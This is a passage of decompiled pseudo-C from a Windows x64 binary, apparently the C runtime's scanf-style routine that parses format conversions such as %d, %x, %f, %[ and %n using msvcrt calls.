sub.msvcrt.dll__errno();\n                iVar14 = *piVar19;\n                goto joined_r0x00014000d71e;\n            }\n            iVar14 = sub.msvcrt.dll_isspace();\n        } while (iVar14 != 0);\n        puVar20 = sub.msvcrt.dll__errno();\n        *puVar20 = uVar15;\n        if ((*(arg1 + 0x201) & 1) == 0) {\n            sub.msvcrt.dll_ungetc();\n            dStack152 = dStack152 + -1;\n        }\n        else {\n            dStack152 = dStack152 + -1;\n            iVar14 = *(arg1 + 0x100c);\n            *(arg1 + iVar14 * 4 + 8) = uVar13;\n            *(arg1 + 0x100c) = iVar14 + 1;\n        }\n        goto code_r0x00014000d298;\n    }\n    if (cVar11 == 'c') goto code_r0x00014000d080;\ncode_r0x00014000d030:\n    // switch table (84 cases) at 0x140017d50\n    switch(cVar11) {\n    case '%':\n        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n        if (uVar13 == 0xffffffff) goto code_r0x00014000fa56;\n        if (uVar13 != 0x25) {\n            fcn.14000ca90(uVar13, arg1, &dStack152, 1);\n            goto code_r0x00014000d8d6;\n        }\n        break;\n    default:\n        puVar3 = puStack160;\n        while (puVar3 != NULL) {\n            puVar30 = puVar3[1];\n            sub.msvcrt.dll_free(puVar3);\n            puVar3 = puVar30;\n        }\n        goto code_r0x00014000cd88;\n    case 'A':\n    case 'E':\n    case 'F':\n    case 'G':\n    case 'a':\n    case 'e':\n    case 'f':\n    case 'g':\n        iVar12 = iVar12 - (0 < iVar12);\n        uVar38 = fcn.14000c9f0(arg1, &dStack152);\n        if (uVar38 == 0xffffffff) {\n            uVar13 = uStack288;\n            if (uStack288 == 0) {\n                uVar13 = uVar38;\n            }\n            goto code_r0x00014000fd8c;\n        }\n        uVar13 = uVar38;\n        if ((uVar38 - 0x2b & 0xfffffffd) == 0) {\n            if ((iVar12 == 0) || (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 == 0xffffffff))\n            goto code_r0x00014000d8d6;\n            iVar12 = iVar12 - (0 < iVar12);\n        }\n        iVar14 = sub.msvcrt.dll_tolower();\n        if (iVar14 == 0x6e) {\n            puStack136 = fcn.14000c8d0(0, &uStack144, puStack136);\n            *puStack136 = uVar13;\n            iVar17 = 1;\n            do {\n                puVar3 = puStack160;\n                if (((iVar12 == 0) ||\n                    (uVar13 = fcn.14000c9f0(arg1, &dStack152),  puVar3 = puStack160,  uVar13 == 0xffffffff)) ||\n                   (iVar14 = sub.msvcrt.dll_tolower(uVar13),  puVar3 = puStack160,  iVar14 != *(iVar17 + 0x140017c86)))\n                goto joined_r0x00014000f92a;\n                iVar12 = iVar12 - (0 < iVar12);\n                puStack136 = fcn.14000c8d0(iVar17, &uStack144, puStack136);\n                puStack232 = iVar17 + 1;\n                *(puStack136 + iVar17) = uVar13;\n                pcVar31 = iVar17 + 0x140017c87;\n                iVar17 = puStack232;\n            } while (*pcVar31 != '\\0');\n        }\n        else if (iVar14 == 0x69) {\n            puStack136 = fcn.14000c8d0(0, &uStack144, puStack136);\n            *puStack136 = uVar13;\n            puStack232 = 1;\n            do {\n                iVar17 = puStack232;\n                puVar3 = puStack160;\n                if (((iVar12 == 0) ||\n                    (uVar13 = fcn.14000c9f0(arg1, &dStack152),  puVar3 = puStack160,  uVar13 == 0xffffffff)) ||\n                   (iVar14 = sub.msvcrt.dll_tolower(uVar13),  puVar3 = puStack160,  iVar14 != *(iVar17 + 0x140017c8a)))\n                goto joined_r0x00014000f5da;\n                iVar12 = iVar12 - (0 < iVar12);\n                puStack136 = fcn.14000c8d0(iVar17, &uStack144, puStack136);\n                puStack232 = iVar17 + 1;\n                *(puStack136 + iVar17) = uVar13;\n            } while (*(iVar17 + 0x140017c8b) != '\\0');\n            if ((iVar12 != 0) && (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 != 0xffffffff)) {\n                iVar14 = sub.msvcrt.dll_tolower();\n                if (iVar14 == 0x69) {\n                    if (0 < iVar12) {\n                        iVar12 = iVar12 + -1;\n                    }\n                    puStack136 = fcn.14000c8d0(puStack232, &uStack144, puStack136);\n                    *(puStack136 + puStack232) = uVar13;\n                    uStack224 = 0x140017c8e;\n                    iVar17 = iVar17 + 2;\n                    do {\n                        if (((iVar12 == 0) || (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 == 0xffffffff)) ||\n                           (iVar14 = sub.msvcrt.dll_tolower(),  iVar14 != *(uStack224 + 1))) goto code_r0x00014000d8d6;\n                        if (0 < iVar12) {\n                            iVar12 = iVar12 + -1;\n                        }\n                        puStack136 = fcn.14000c8d0(iVar17, &uStack144, puStack136);\n                        puStack232 = iVar17 + 1;\n                        *(puStack136 + iVar17) = uVar13;\n                        pcVar31 = uStack224 + 2;\n                        iVar17 = puStack232;\n                        uStack224 = uStack224 + 1;\n                    } while (*pcVar31 != '\\0');\n                }\n                else {\n                    fcn.14000ca90(uVar13, arg1, &dStack152, 0);\n                }\n            }\n        }\n        else {\n            uStack224._0_1_ = 'e';\n            puStack232 = NULL;\n            if ((iVar12 != 0) && (uVar13 == 0x30)) {\n                puStack136 = fcn.14000c8d0(0, &uStack144, puStack136);\n                *puStack136 = 0x30;\n                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                if (0 < iVar12) {\n                    puStack232 = 0x1;\n                    iVar12 = iVar12 + -1;\n                    if (iVar12 == 0) goto code_r0x00014000d9ca;\n                }\n                iVar14 = sub.msvcrt.dll_tolower(uVar13);\n                if (iVar14 == 0x78) {\n                    bVar9 = false;\n                    bVar40 = true;\n                    puStack136 = fcn.14000c8d0(1, &uStack144, puStack136);\n                    *(puStack136 + 1) = uVar13;\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    if (iVar12 < 1) {\n                        uStack224._0_1_ = 'p';\n                        puStack232 = 0x2;\n                    }\n                    else {\n                        uStack224._0_1_ = 'p';\n                        iVar12 = iVar12 + -1;\n                        puStack232 = 0x2;\n                    }\n                }\n                else {\n                    uStack224._0_1_ = 'e';\n                    puStack232 = 0x1;\n                }\n            }\ncode_r0x00014000d9ca:\n            bVar5 = false;\n            bVar6 = false;\njoined_r0x00014000da16:\n            if (uVar13 - 0x30 < 10) {\ncode_r0x00014000da9b:\n                puStack136 = fcn.14000c8d0(puStack232, &uStack144, puStack136);\n                *(puStack136 + puStack232) = uVar13;\n                puStack232 = puStack232 + 1;\ncode_r0x00014000dab6:\n                if ((iVar12 != 0) && (uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 != 0xffffffff))\n                goto code_r0x00014000dad4;\n            }\n            else {\n                if (!bVar5) {\n                    if ((!bVar40) || (iVar14 = sub.msvcrt.dll_isxdigit(),  iVar14 == 0)) {\n                        if ((puStack232 == NULL) || (cVar11 = sub.msvcrt.dll_tolower(),  uStack224 != cVar11))\n                        goto code_r0x00014000da3e;\n                        puStack136 = fcn.14000c8d0(puStack232, &uStack144, puStack136);\n                        bVar5 = true;\n                        bVar6 = true;\n                        *(puStack136 + puStack232) = uStack224;\n                        puStack232 = puStack232 + 1;\n                        goto code_r0x00014000dab6;\n                    }\n                    goto code_r0x00014000da9b;\n                }\n                if ((*(puStack136 + puStack232 + -1) == uStack224) && ((uVar13 - 0x2b & 0xfffffffd) == 0))\n                goto code_r0x00014000da9b;\ncode_r0x00014000da3e:\n                iVar14 = 0x7fffffff;\n                if (0 < iVar12) {\n                    iVar14 = iVar12;\n                }\n                uVar10 = *puVar2;\n                puVar25 = puStack296;\n                if (bVar6) {\n                    if (uVar10 != 0) goto code_r0x00014000e285;\n                    if (iVar12 < 1) goto code_r0x00014000dab6;\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    if (uVar13 != 0xffffffff) goto code_r0x00014000da88;\n                }\n                else {\n                    puVar32 = puVar2;\n                    puVar35 = puVar2;\n                    if (uVar10 == uVar13) {\n                        do {\n                            puVar32 = puVar35 + 1;\n                            if (*puVar32 == 0) goto code_r0x00014000e455;\n                            if (iVar14 == 0) goto code_r0x00014000e38c;\n                            uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                            if (uVar13 == 0xffffffff) {\n                                uVar10 = puVar35[1];\n                                break;\n                            }\n                            uVar10 = *puVar32;\n                            iVar14 = iVar14 + -1;\n                            puVar35 = puVar32;\n                        } while (uVar13 == uVar10);\n                    }\n                    if (uVar10 == 0) {\ncode_r0x00014000e455:\n                        uVar10 = *puVar2;\n                        iVar17 = puStack232;\n                        while (uVar10 != 0) {\n                            puStack136 = fcn.14000c8d0(iVar17, &uStack144, puStack136);\n                            iVar37 = iVar17 + 1;\n                            *(puStack136 + iVar17) = puVar2[iVar37 + (-1 - puStack232)];\n                            iVar17 = iVar37;\n                            uVar10 = puVar2[iVar37 - puStack232];\n                        }\n                        puStack232 = iVar17;\n                        if (iVar12 < 1) {\n                            bVar6 = true;\n                        }\n                        else {\n                            bVar6 = true;\n                            iVar12 = iVar14;\n                        }\n                        goto code_r0x00014000dab6;\n                    }\ncode_r0x00014000e38c:\n                    if (bVar9) {\n                        iVar37 = puVar32 - puVar2;\n                        iVar17 = 0;\n                        if (iVar37 < 1) {\n                            if (puVar32 == puVar2) goto code_r0x00014000e3e3;\n                            goto code_r0x00014000e285;\n                        }\n                        do {\n                            uVar10 = *puVar25;\n                            if (uVar10 != puVar2[iVar17]) goto code_r0x00014000e29b;\n                            puVar25 = puVar25 + 1;\n                            iVar17 = puVar25 - puStack296;\n                        } while (iVar17 < iVar37);\n                        if (iVar17 != iVar37) goto code_r0x00014000e296;\ncode_r0x00014000e3e3:\n                        uVar10 = *puVar25;\n                        if (uVar10 == uVar13) {\n                            do {\n                                puVar32 = puVar25 + 1;\n                                if (*puVar32 == 0) goto code_r0x00014000e2a3;\n                                if (iVar14 == 0) goto code_r0x00014000f64e;\n                                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                                if (uVar13 == 0xffffffff) {\n                                    uVar10 = puVar25[1];\n                                    break;\n                                }\n                                uVar10 = *puVar32;\n                                iVar14 = iVar14 + -1;\n                                puVar25 = puVar32;\n                            } while (uVar13 == uVar10);\n                        }\ncode_r0x00014000e29b:\n                        if (uVar10 == 0) {\ncode_r0x00014000e2a3:\n                            if (0 < iVar12) {\n                                iVar12 = iVar14;\n                            }\n                            goto code_r0x00014000dab6;\n                        }\n                    }\n                    else {\ncode_r0x00014000e285:\n                        if (puStack296 != NULL) {\ncode_r0x00014000e296:\n                            uVar10 = *puVar25;\n                            goto code_r0x00014000e29b;\n                        }\n                    }\n                    if (uVar13 != 0xffffffff) {\ncode_r0x00014000f64e:\n                        if ((*(arg1 + 0x201) & 1) == 0) {\n                            sub.msvcrt.dll_ungetc(uVar13, *arg1);\n                            dStack152 = dStack152 + -1;\n                        }\n                        else {\n                            dStack152 = dStack152 + -1;\n                            iVar12 = *(arg1 + 0x100c);\n                            *(arg1 + iVar12 * 4 + 8) = uVar13;\n                            *(arg1 + 0x100c) = iVar12 + 1;\n                        }\n                    }\n                }\n            }\n            if ((puStack232 == NULL) || ((bVar40 && (puStack232 == 0x2)))) goto code_r0x00014000d8d6;\n        }\n        puStack136 = fcn.14000c8d0(puStack232, &uStack144, puStack136);\n        *(puStack136 + puStack232) = 0;\n        if (bVar41) {\n            fcn.140010430(&fStack184, puStack136, &puStack128);\n            if (bVar4) goto code_r0x00014000f026;\n            if (puStack128 == puStack136) goto code_r0x00014000d8d6;\n            fVar42 = fStack184;\n            if (uVar38 == 0x2d) {\n                fVar42 = -fStack184;\n            }\n            if (uVar1 == 0) {\n                pfVar21 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n                *pfVar21 = fVar42;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                **ppfVar22 = fVar42;\n            }\n        }\n        else if (bVar39) {\n            fcn.140010430(&fStack184, puStack136, &puStack128);\n            if (bVar4) {\ncode_r0x00014000f026:\n                if (puStack136 == puStack128) goto code_r0x00014000d8d6;\n                break;\n            }\n            if (puStack128 == puStack136) goto code_r0x00014000d8d6;\n            dVar18 = fStack184;\n            if (uVar38 == 0x2d) {\n                dVar18 = dVar18 ^ SUB168(auVar43, 0);\n            }\n            if (uVar1 == 0) {\n                pfVar21 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                pfVar21 = *ppfVar22;\n            }\n            *pfVar21 = dVar18;\n        }\n        else {\n            uVar29 = fcn.140010390();\n            if (bVar4) goto code_r0x00014000f026;\n            if (puStack128 == puStack136) goto code_r0x00014000d8d6;\n            if (uVar38 == 0x2d) {\n                uVar29 = uVar29 ^ uVar44;\n            }\n            if (uVar1 == 0) {\n                pfVar21 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                pfVar21 = *ppfVar22;\n            }\n            *pfVar21 = uVar29;\n        }\n        if (puStack136 == puStack128) goto code_r0x00014000d8d6;\n        uStack288 = uStack288 + 1;\n        uVar38 = 0;\n        goto code_r0x00014000cdc9;\n    case 'C':\n        goto code_r0x00014000d438;\n    case 'S':\n        goto code_r0x00014000d2b6;\n    case 'X':\n    case 'd':\n    case 'i':\n    case 'o':\n    case 'p':\n    case 'u':\n    case 'x':\n    // switch table (33 cases) at 0x140017ea0\n        switch(cVar11) {\n        case 'X':\n        case 'x':\n            uStack284 = 0x10;\n            break;\n        case 'd':\n            uStack284 = 10;\n            bVar7 = true;\n            break;\n        case 'i':\n            uStack284 = 0;\n            bVar7 = true;\n            break;\n        case 'o':\n            uStack284 = 8;\n            break;\n        case 'p':\n            bVar7 = false;\n            uStack284 = 0x10;\n            bVar8 = true;\n            bVar5 = false;\n            bVar41 = true;\n            bVar39 = true;\n            break;\n        case 'u':\n            uStack284 = 10;\n        }\n        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n        if (uVar13 == 0xffffffff) goto code_r0x00014000fa56;\n        bVar40 = (uVar13 - 0x2b & 0xfffffffd) == 0;\n        if (bVar40) {\n            puStack136 = fcn.14000c8d0(0, &uStack144, puStack136);\n            *puStack136 = uVar13;\n            iVar12 = iVar12 - (0 < iVar12);\n            uVar13 = fcn.14000c9f0(arg1, &dStack152);\n        }\n        uStack224 = bVar40;\n        if ((uVar13 != 0x30) || (iVar12 == 0)) {\n            if (uStack284 == 0) {\n                uStack284 = 10;\n            }\n            if (uVar13 != 0xffffffff && iVar12 != 0) goto code_r0x00014000e8db;\ncode_r0x00014000e997:\n            if (uStack224 != 0) goto code_r0x00014000dc59;\n            if ((bVar8) && (cVar11 = sub.msvcrt.dll_tolower(),  cVar11 == '(')) {\n                pcVar31 = 0x140017c81;\n                do {\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    if ((uVar13 == 0xffffffff) || (cVar11 = sub.msvcrt.dll_tolower(),  *pcVar31 != cVar11))\n                    goto code_r0x00014000e9e7;\n                    pcVar31 = pcVar31 + 1;\n                } while (*pcVar31 != '\\0');\n                puStack136 = fcn.14000c8d0(0, &uStack144, puStack136);\n                uStack224 = 1;\n                *puStack136 = 0x30;\n                goto code_r0x00014000dcb4;\n            }\n        }\n        else {\n            uVar26 = uStack224 + 1;\n            if (iVar12 < 1) {\n                puStack136 = fcn.14000c8d0(uStack224, &uStack144, puStack136);\n                *(puStack136 + uStack224) = 0x30;\n                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n            }\n            else {\n                iVar12 = iVar12 + -1;\n                puStack136 = fcn.14000c8d0(uStack224, &uStack144, puStack136);\n                *(puStack136 + uStack224) = 0x30;\n                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                if (iVar12 == 0) {\n                    uStack224 = uVar26;\n                    if (uStack284 == 0) {\n                        uStack284 = 8;\n                    }\n                    goto code_r0x00014000dc59;\n                }\n            }\n            iVar14 = sub.msvcrt.dll_tolower();\n            if (iVar14 == 0x78) {\n                if ((uStack284 & 10) == 0) {\n                    iVar12 = iVar12 - (0 < iVar12);\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    uStack284 = 0x10;\n                    bVar40 = iVar12 != 0 && uVar13 != 0xffffffff;\n                }\n                else {\n                    bVar40 = iVar12 != 0 && uVar13 != 0xffffffff;\n                }\n            }\n            else {\n                bVar40 = iVar12 != 0 && uVar13 != 0xffffffff;\n                if (uStack284 == 0) {\n                    uStack284 = 8;\n                }\n            }\n            uStack224 = uVar26;\n            if (bVar40) {\ncode_r0x00014000e8db:\n                do {\n                    if (uStack284 == 0x10) {\n                        iVar14 = sub.msvcrt.dll_isxdigit();\n                        if (iVar14 == 0) goto code_r0x00014000e997;\ncode_r0x00014000e929:\n                        uVar26 = uStack224;\n                        uStack224 = uStack224 + 1;\n                    }\n                    else {\n                        if ((uVar13 - 0x30 < 10) && (uVar13 - 0x2f <= uStack284)) goto code_r0x00014000e929;\n                        if ((uStack284 != 10) || (!bVar9)) goto code_r0x00014000e997;\n                        iVar14 = 0x7fffffff;\n                        if (0 < iVar12) {\n                            iVar14 = iVar12;\n                        }\n                        uVar10 = *puStack296;\n                        puVar25 = puStack296;\n                        puVar32 = puStack296;\n                        if (uVar13 == uVar10) {\n                            do {\n                                puVar25 = puVar32 + 1;\n                                if (*puVar25 == 0) goto code_r0x00014000ebaa;\n                                if (iVar14 == 0) goto code_r0x00014000ebba;\n                                uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                                if (uVar13 == 0xffffffff) {\n                                    uVar10 = puVar32[1];\n                                    break;\n                                }\n                                uVar10 = *puVar25;\n                                iVar14 = iVar14 + -1;\n                                puVar32 = puVar25;\n                            } while (uVar13 == uVar10);\n                        }\n                        if (uVar10 != 0) {\ncode_r0x00014000ebba:\n                            if (puStack296 < puVar25) {\n                                fcn.14000ca90(uVar13, arg1, &dStack152, 0);\n                                puVar32 = puVar25 + -1;\n                                puVar35 = puVar32;\n                                if (puStack296 < puVar32) {\n                                    do {\n                                        if ((*(arg1 + 0x201) & 1) == 0) {\n                                            sub.msvcrt.dll_ungetc(*puVar35, *arg1);\n                                        }\n                                        else {\n                                            iVar12 = *(arg1 + 0x100c);\n                                            *(arg1 + iVar12 * 4 + 8) = *puVar35;\n                                            *(arg1 + 0x100c) = iVar12 + 1;\n                                        }\n                                        dStack152 = dStack152 + -1;\n                                        puVar35 = puVar35 + -1;\n                                    } while (puVar35 != puStack296);\n                                    puVar32 = puVar32 + puStack296 + (1 - puVar25);\n                                }\n                                uVar13 = *puVar32;\n                            }\n                            goto code_r0x00014000e997;\n                        }\ncode_r0x00014000ebaa:\n                        uVar26 = uStack224 - 1;\n                        if (0 < iVar12) {\n                            iVar12 = iVar14;\n                        }\n                    }\n                    puStack136 = fcn.14000c8d0(uVar26, &uStack144, puStack136);\n                    *(puStack136 + uVar26) = uVar13;\n                    iVar12 = iVar12 - (0 < iVar12);\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    if ((uVar13 == 0xffffffff) || (iVar12 == 0)) goto code_r0x00014000e997;\n                } while( true );\n            }\ncode_r0x00014000dc59:\n            if ((uStack224 != 1) || ((*puStack136 - 0x2bU & 0xfd) != 0)) {\n                if (uVar13 != 0xffffffff) {\n                    if ((*(arg1 + 0x201) & 1) == 0) {\n                        sub.msvcrt.dll_ungetc(uVar13, *arg1);\n                        dStack152 = dStack152 + -1;\n                    }\n                    else {\n                        dStack152 = dStack152 + -1;\n                        iVar12 = *(arg1 + 0x100c);\n                        *(arg1 + iVar12 * 4 + 8) = uVar13;\n                        *(arg1 + 0x100c) = iVar12 + 1;\n                    }\n                }\ncode_r0x00014000dcb4:\n                puStack136 = fcn.14000c8d0(uStack224, &uStack144, puStack136);\n                *(puStack136 + uStack224) = 0;\n                if (bVar41) {\n                    if (bVar7) {\n                        dStack200 = fcn.1400104e0(puStack136, &puStack128, uStack284);\n                    }\n                    else {\n                        dStack200 = fcn.140010750(puStack136, &puStack128, uStack284);\n                    }\n                }\n                else {\n                    if (bVar7) {\n                        uVar38 = sub.msvcrt.dll_strtol();\n                    }\n                    else {\n                        uVar38 = sub.msvcrt.dll_strtoul();\n                    }\n                    dStack200 = dStack200 & 0xffffffff00000000 | uVar38;\n                }\n                if (puStack136 == puStack128) goto code_r0x00014000d8d6;\n                uVar38 = bVar4 << 7;\n                if (bVar4) break;\n                if (bVar7) {\n                    if (bVar41) goto code_r0x00014000f3f9;\n                    if (bVar39) {\ncode_r0x00014000f766:\n                        if (uVar1 != 0) {\n                            ppfVar22 = arg3;\n                            if (uVar1 != 1) {\n                                ppfVar22 = arg3 + (uVar1 - 1);\n                            }\n                            goto code_r0x00014000fc77;\n                        }\ncode_r0x00014000f774:\n                        pfVar21 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                        *pfVar21 = dStack200._0_4_;\n                    }\n                    else if (bVar5) {\ncode_r0x00014000fc30:\n                        if (uVar1 == 0) {\n                            pfVar21 = *ppfStack280;\n                            ppfStack280 = ppfStack280 + 1;\n                        }\n                        else {\n                            ppfVar22 = arg3;\n                            if (uVar1 != 1) {\n                                ppfVar22 = arg3 + (uVar1 - 1);\n                            }\n                            pfVar21 = *ppfVar22;\n                        }\n                        *pfVar21 = SUB82(dStack200, 0);\n                    }\n                    else {\n                        if (!bVar6) {\n                            if (uVar1 != 0) {\n                                bVar4 = false;\n                                uVar29 = uVar1;\n                                while (uVar29 = uVar29 - 1,  uVar29 != 0) {\n                                    bVar4 = true;\n                                }\n                                goto code_r0x00014000ff89;\n                            }\n                            goto code_r0x00014000f774;\n                        }\n                        if (uVar1 == 0) goto code_r0x00014000dd7a;\n                        bVar4 = false;\n                        uVar29 = uVar1;\n                        while (uVar29 = uVar29 - 1,  uVar29 != 0) {\n                            bVar4 = true;\n                        }\ncode_r0x00014000f46e:\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                        if (!bVar4) {\n                            ppfVar22 = arg3;\n                        }\n                        pfVar21 = *ppfVar22;\ncode_r0x00014000dd8b:\n                        *pfVar21 = SUB81(dStack200, 0);\n                    }\n                }\n                else {\n                    if (!bVar41) {\n                        if (bVar39) goto code_r0x00014000f766;\n                        if (bVar5) goto code_r0x00014000fc30;\n                        if (bVar6) {\n                            if (uVar1 != 0) {\n                                bVar4 = false;\n                                uVar29 = uVar1;\n                                while (uVar29 = uVar29 - 1,  uVar29 != 0) {\n                                    bVar4 = true;\n                                }\n                                goto code_r0x00014000f46e;\n                            }\ncode_r0x00014000dd7a:\n                            pfVar21 = *ppfStack280;\n                            ppfStack280 = ppfStack280 + 1;\n                            goto code_r0x00014000dd8b;\n                        }\n                        if (uVar1 == 0) goto code_r0x00014000f774;\n                        bVar4 = false;\n                        uVar29 = uVar1;\n                        while (uVar29 = uVar29 - 1,  uVar29 != 0) {\n                            bVar4 = true;\n                        }\ncode_r0x00014000ff89:\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                        if (!bVar4) {\n                            ppfVar22 = arg3;\n                        }\ncode_r0x00014000fc77:\n                        **ppfVar22 = dStack200._0_4_;\n                        goto code_r0x00014000dd8d;\n                    }\ncode_r0x00014000f3f9:\n                    if (uVar1 == 0) {\n                        pfVar21 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                    }\n                    else {\n                        ppfVar22 = arg3;\n                        if (uVar1 != 1) {\n                            ppfVar22 = arg3 + (uVar1 - 1);\n                        }\n                        pfVar21 = *ppfVar22;\n                    }\n                    *pfVar21 = dStack200;\n                }\ncode_r0x00014000dd8d:\n                uStack288 = uStack288 + 1;\n                goto code_r0x00014000cdc9;\n            }\n        }\ncode_r0x00014000e9e7:\n        fcn.14000ca90(uVar13, arg1, &dStack152, 0);\n        goto code_r0x00014000d8d6;\n    case '[':\n        if (bVar39) {\n            if (bVar4) goto code_r0x00014000e01c;\n            if ((uVar26 & 0x600) == 0) {\n                if (uVar1 == 0) {\n                    pfStack272 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                    pfVar21 = pfStack272;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfStack272 = *ppfVar22;\n                    pfVar21 = pfStack272;\n                }\njoined_r0x00014000f4ba:\n                if (pfVar21 != NULL) goto code_r0x00014000e01c;\n                goto code_r0x00014000d8d6;\n            }\n            if (uVar1 == 0) {\n                pfStack304 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                pfStack304 = *ppfVar22;\n            }\n            if (pfStack304 == NULL) goto code_r0x00014000f981;\n            pfStack272 = sub.msvcrt.dll_malloc();\n            *pfStack304 = pfStack272;\n            puVar3 = puStack160;\n            pfVar21 = pfStack272;\n        }\n        else {\n            if (bVar4 != false) goto code_r0x00014000e01c;\n            if ((uVar26 & 0x600) == 0) {\n                if (uVar1 == 0) {\n                    pfStack248 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                    pfVar21 = pfStack248;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfStack248 = *ppfVar22;\n                    pfVar21 = pfStack248;\n                }\n                goto joined_r0x00014000f4ba;\n            }\n            if (uVar1 == 0) {\n                pfStack304 = *ppfStack280;\n                ppfStack280 = ppfStack280 + 1;\n            }\n            else {\n                ppfVar22 = arg3;\n                if (uVar1 != 1) {\n                    ppfVar22 = arg3 + (uVar1 - 1);\n                }\n                pfStack304 = *ppfVar22;\n            }\n            if (pfStack304 == NULL) goto code_r0x00014000f981;\n            pfStack248 = sub.msvcrt.dll_malloc();\n            *pfStack304 = pfStack248;\n            puVar3 = puStack160;\n            pfVar21 = pfStack248;\n        }\n        puStack160 = puVar3;\n        if (pfVar21 == NULL) goto code_r0x00014000ecff;\n        if (puVar3 == NULL) {\ncode_r0x00014000dfe2:\n            puStack160 = sub.msvcrt.dll_malloc(0x110);\n            uVar24 = 1;\n            uVar36 = 0;\n            *puStack160 = 0;\n            puStack160[1] = puVar3;\n        }\n        else {\n            uVar36 = *puVar3;\n            uVar24 = uVar36 + 1;\n            if (0x1f < uVar36) goto code_r0x00014000dfe2;\n        }\n        *puStack160 = uVar24;\n        puStack160[uVar36 + 2] = pfStack304;\n        uStack256 = 100;\ncode_r0x00014000e01c:\n        pfVar21 = pfStack304;\n        bVar41 = puStack232[1] == 0x5e;\n        if (bVar41) {\n            puVar33 = puStack232 + 2;\n        }\n        if (iVar12 < 0) {\n            iVar12 = 0x7fffffff;\n        }\n        if (uStack144 < 0x100) {\n            uStack144 = 0x100;\n            if (puStack136 != NULL) {\n                sub.msvcrt.dll_free();\n            }\n            puStack136 = sub.msvcrt.dll_malloc(uStack144);\n        }\n        dVar18 = dStack152;\n        *puStack136 = 0;\n        puStack136[0x1f] = 0;\n        puVar34 = puStack136 + 1 & 0xfffffffffffffff8;\n        for (uVar24 = (puStack136 - (puStack136 + 1 & 0xfffffffffffffff8)) + 0x100U >> 3; uVar24 != 0;\n            uVar24 = uVar24 - 1) {\n            *puVar34 = 0;\n            puVar34 = puVar34 + 1;\n        }\n        uVar10 = *puVar33;\n        uVar24 = uVar10;\n        if ((uVar10 == 0x5d) || (uVar10 == 0x2d)) {\n            puVar33 = puVar33 + 1;\n            *(puStack136 + uVar24) = 1;\n            uVar24 = *puVar33;\n        }\n        puVar25 = puVar33 + 1;\n        uVar10 = uVar24;\njoined_r0x00014000e0d0:\n        puVar33 = puVar25;\n        if (uVar10 != 0) {\n            do {\n                if (uVar24 == ']') {\n                    if (bVar39) {\n                        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                        if (uVar13 == 0xffffffff) goto code_r0x00014000fa56;\n                        iVar17 = 0;\n                        auStack112[0] = 0;\n                        goto code_r0x00014000e57f;\n                    }\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    if (uVar13 == 0xffffffff) goto code_r0x00014000fa56;\n                    uVar38 = bVar39 << 2;\n                    goto code_r0x00014000ee67;\n                }\n                puVar25 = puVar33 + 1;\n                if (((uVar24 != '-') || (uVar10 = *puVar33,  uVar10 == 0x5d)) || (uVar10 == 0)) {\ncode_r0x00014000e0e0:\n                    *(puStack136 + uVar24) = 1;\n                    uVar10 = *puVar33;\n                    goto code_r0x00014000e0f1;\n                }\n                uVar27 = puVar33[-2];\n                if (uVar10 < uVar27) goto code_r0x00014000e0e0;\n                if (uVar27 < uVar10) goto code_r0x00014000e126;\n                uVar24 = uVar10;\n                puVar33 = puVar25;\n            } while( true );\n        }\n        goto code_r0x00014000d8d6;\n    case 'c':\n        goto code_r0x00014000d08a;\n    case 'n':\n        uVar38 = bVar4 << 7;\n        if (!bVar4) {\n            if (bVar41) {\n                if (uVar1 == 0) {\n                    pfVar21 = *ppfStack280;\n                    ppfStack280 = ppfStack280 + 1;\n                }\n                else {\n                    ppfVar22 = arg3;\n                    if (uVar1 != 1) {\n                        ppfVar22 = arg3 + (uVar1 - 1);\n                    }\n                    pfVar21 = *ppfVar22;\n                }\n                *pfVar21 = dStack152;\n            }\n            else {\n                uVar38 = bVar39 << 2;\n                uVar15 = SUB84(dStack152, 0);\n                if (bVar39) {\n                    if (uVar1 == 0) {\n                        pfVar21 = *ppfStack280;\n                        ppfStack280 = ppfStack280 + 1;\n                    }\n                    else {\n                        ppfVar22 = arg3;\n                        if (uVar1 != 1) {\n                            ppfVar22 = arg3 + (uVar1 - 1);\n                